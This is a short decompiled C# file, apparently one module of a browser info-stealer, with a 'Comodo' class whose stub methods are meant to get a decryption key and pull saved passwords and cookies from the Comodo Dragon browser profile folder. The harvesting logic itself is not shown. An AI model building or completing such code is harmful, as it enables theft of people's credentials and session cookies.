﻿using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;

namespace SHARP
{
	// Token: 0x0200001F RID: 31
	internal static class Comodo
	{
		// Token: 0x060000B8 RID: 184 RVA: 0x0000506C File Offset: 0x0000326C
		private static Task<byte[]> GetEncryptionKey()
		{
			Comodo.<GetEncryptionKey>d__3 <GetEncryptionKey>d__;
			<GetEncryptionKey>d__.<>t__builder = AsyncTaskMethodBuilder<byte[]>.Create();
			<GetEncryptionKey>d__.<>1__state = -1;
			<GetEncryptionKey>d__.<>t__builder.Start<Comodo.<GetEncryptionKey>d__3>(ref <GetEncryptionKey>d__);
			return <GetEncryptionKey>d__.<>t__builder.Task;
		}

		// Token: 0x060000B9 RID: 185 RVA: 0x000050A8 File Offset: 0x000032A8
		private static Task<byte[]> DecryptData(byte[] buffer)
		{
			Comodo.<DecryptData>d__4 <DecryptData>d__;
			<DecryptData>d__.<>t__builder = AsyncTaskMethodBuilder<byte[]>.Create();
			<DecryptData>d__.buffer = buffer;
			<DecryptData>d__.<>1__state = -1;
			<DecryptData>d__.<>t__builder.Start<Comodo.<DecryptData>d__4>(ref <DecryptData>d__);
			return <DecryptData>d__.<>t__builder.Task;
		}

		// Token: 0x060000BA RID: 186 RVA: 0x000050EC File Offset: 0x000032EC
		internal static Task<PasswordFormat[]> GetPasswords()
		{
			Comodo.<GetPasswords>d__5 <GetPasswords>d__;
			<GetPasswords>d__.<>t__builder = AsyncTaskMethodBuilder<PasswordFormat[]>.Create();
			<GetPasswords>d__.<>1__state = -1;
			<GetPasswords>d__.<>t__builder.Start<Comodo.<GetPasswords>d__5>(ref <GetPasswords>d__);
			return <GetPasswords>d__.<>t__builder.Task;
		}

		// Token: 0x060000BB RID: 187 RVA: 0x00005128 File Offset: 0x00003328
		internal static Task<CookieFormat[]> GetCookies()
		{
			Comodo.<GetCookies>d__6 <GetCookies>d__;
			<GetCookies>d__.<>t__builder = AsyncTaskMethodBuilder<CookieFormat[]>.Create();
			<GetCookies>d__.<>1__state = -1;
			<GetCookies>d__.<>t__builder.Start<Comodo.<GetCookies>d__6>(ref <GetCookies>d__);
			return <GetCookies>d__.<>t__builder.Task;
		}

		// Token: 0x0400004B RID: 75
		private static readonly string BrowserPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Comodo", "Dragon", "User Data");

		// Token: 0x0400004C RID: 76
		private static byte[] _encryptionKey = null;
	}
}
